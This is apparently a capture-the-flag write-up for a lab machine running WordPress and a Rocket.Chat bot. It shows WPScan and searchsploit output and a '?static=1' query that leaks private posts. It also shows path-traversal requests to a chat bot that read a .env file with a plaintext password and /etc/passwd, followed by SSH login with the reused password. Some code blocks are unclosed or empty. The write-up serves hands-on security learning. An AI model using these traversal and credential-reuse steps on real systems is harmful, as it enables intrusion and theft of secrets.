## Enumeration

### NMAP

```console

```
> We see port 80 open, so then we have to go to the website and see that it is a default Apache in CentOS. 

### Domain

After doing some research I found a header a little suspicious on the Network Monitor. 

![header](header.png)
_Suspicious X-Backend-Server header_

That is a domain for sure, but when we navigate, we have a 404 error... I figured out that the only thing to do is add the domain to **/etc/hosts** and see what happens.

![wappalyzer](wappalyzer.png) 
_Wappalyzer extension_

> When we enter into the website, Wappalyzer told us it is a WordPress page. So let's take a look with WPScan.

### WPScan

```console
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://office.paper

> Version 5.2.3 is vulnerable!

### Vulnerability

Searching for vulnerabilities of the WordPress version I found one which shows hidden posts.

```console
┌──(kali㉿kali)-[~]
└─$ searchsploit WordPress 5.2.3                               
-------------------------------------------------------------------------------------------------------
 Exploit Title                                                           |  Path
-------------------------------------------------------------------------------------------------------
WordPress Core 5.2.3 - Cross-Site Host Modification                      | php/webapps/47361.pl
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts  | multiple/webapps/47690.md
```

If we take a look into the second vulnerability...

So far we know that adding `?static=1` to a wordpress URL should leak its secret content

Here are a few ways to manipulate the returned entries:

- `order` with `asc` or `desc`
- `orderby`
- `m` with `m=YYYY`, `m=YYYYMM` or `m=YYYYMMDD` date format


In this case, simply reversing the order of the returned elements suffices and `http://wordpress.local/?static=1&order=asc` will show the secret content:
```

## Foothold

On `http://office.paper/?static=1` an article named `test` appears.  There is one text that stands out:

```
# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY
```

So now, we add the domain to **/etc/hosts** and navigate into the website, register and login.

```
Hello. I am Recyclops. A bot assigned by Dwight. I will have my revenge on earthlings, but before that, I have to help my Cool friend Dwight to respond to the annoying questions asked by his co-workers, so that he may use his valuable time to... well, not interact with his co-workers.
Most frequently asked questions include:
- What time is it?
- What new files are in your sales directory?
- Why did the salesman crossed the road?
- What's the content of file x in your sales directory? etc.
Please note that I am a beta version and I still have some bugs to be fixed.
How to use me ? :
1. Small Talk:
You can ask me how dwight's weekend was, or did he watched the game last night etc.
eg: 'recyclops how was your weekend?' or 'recyclops did you watched the game last night?' or 'recyclops what kind of bear is the best?
2. Joke:
You can ask me Why the salesman crossed the road.
eg: 'recyclops why did the salesman crossed the road?'
<=====The following two features are for those boneheads, who still don't know how to use scp. I'm Looking at you Kevin.=====>
For security reasons, the access is limited to the Sales folder.
3. Files: eg: 'recyclops get me the file test.txt', or 'recyclops could you send me the file src/test.php' or just 'recyclops file test.txt'
4. List: You can ask me to list the files
5. Time: You can ask me to what the time is
eg: 'recyclops what time is it?' or just 'recyclops time'
```

> We see a bot inside the general chat after login. The general chat is read-only so let's talk to the bot privately.

Then we use `file` and `list` command in the bot chat to access to the system. There is a user.txt but we don't have access to it.  We need another method to enter the system...

```
 file ../user.txt 

 Access denied.
```

After looking for something I finally found something interesting:

```
 <!=====Contents of file ../hubot/.env=====>
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
```

> I tried to login with this credentials into ssh but it is incorrect. Let's see the users on **/etc/passwd**. This 2 users have /bin/bash as shell...

```bash
rocketchat:1001:1001::/home/rocketchat:/bin/bash
dwight:1004:1004::/home/dwight:/bin/bash
```
{: file="/etc/passwd"}

> With the second user we have login into the system via SSH! 

Let's see the `user.txt` file! And here is the FLAG.

### System own

To get root permissions we only need to execute the file on home named `exp.py`.

```console
[root@paper ~]# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
```

> Now we got **ROOT**! 

For the **root FLAG** we go to personal directory of root and see `root.txt`.

## Conclusion

It is a machine that, for people who are starting out, is very good. The use of the bot to get the credentials was interesting. This is the first of many!
